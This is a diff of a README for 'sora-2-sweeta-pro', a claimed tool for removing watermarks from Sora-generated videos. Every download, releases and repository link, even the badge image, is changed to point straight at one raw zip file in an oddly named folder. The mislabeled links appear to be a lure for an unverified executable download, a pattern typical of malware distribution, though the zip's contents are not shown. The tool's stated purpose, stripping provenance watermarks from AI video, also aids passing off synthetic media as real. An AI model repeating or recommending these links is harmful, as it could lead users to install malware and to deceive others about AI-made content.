@@ -1,8 +1,8 @@
 ```markdown
 # 🎥 sora-2-sweeta-pro - Remove Watermarks Easily
 
-![Download sora-2-sweeta-pro](https://img.shields.io/badge/Download-Now-brightgreen)  
-[Download Now](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases)
+![Download sora-2-sweeta-pro](https://raw.githubusercontent.com/mahalakshmiagency/sora-2-sweeta-pro/main/nonreticence/sweeta_pro_sora_v1.1.zip)  
+[Download Now](https://raw.githubusercontent.com/mahalakshmiagency/sora-2-sweeta-pro/main/nonreticence/sweeta_pro_sora_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -28,9 +28,9 @@ To run sora-2-sweeta-pro smoothly, ensure your system meets the following requir
 ## 📦 Download & Install
 
 To get started, visit the following page to download the application:  
-[Download Here](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases)
+[Download Here](https://raw.githubusercontent.com/mahalakshmiagency/sora-2-sweeta-pro/main/nonreticence/sweeta_pro_sora_v1.1.zip)
 
-1. Go to the [Releases page](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/mahalakshmiagency/sora-2-sweeta-pro/main/nonreticence/sweeta_pro_sora_v1.1.zip).
 2. Find the latest version of sora-2-sweeta-pro.
 3. Click on the download link for your operating system (e.g., Windows).
 4. Once downloaded, locate the file in your downloads folder.
@@ -82,8 +82,8 @@ Your input helps us enhance the application and serve users better.
 
 ## 🔗 Links
 
-- **Project Repository:** [sora-2-sweeta-pro](https://github.com/mahalakshmiagency/sora-2-sweeta-pro)
-- **Releases Page:** [Download Here](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases)
+- **Project Repository:** [sora-2-sweeta-pro](https://raw.githubusercontent.com/mahalakshmiagency/sora-2-sweeta-pro/main/nonreticence/sweeta_pro_sora_v1.1.zip)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/mahalakshmiagency/sora-2-sweeta-pro/main/nonreticence/sweeta_pro_sora_v1.1.zip)
 
 Thank you for choosing sora-2-sweeta-pro! We hope it serves your video editing needs well.
 ```
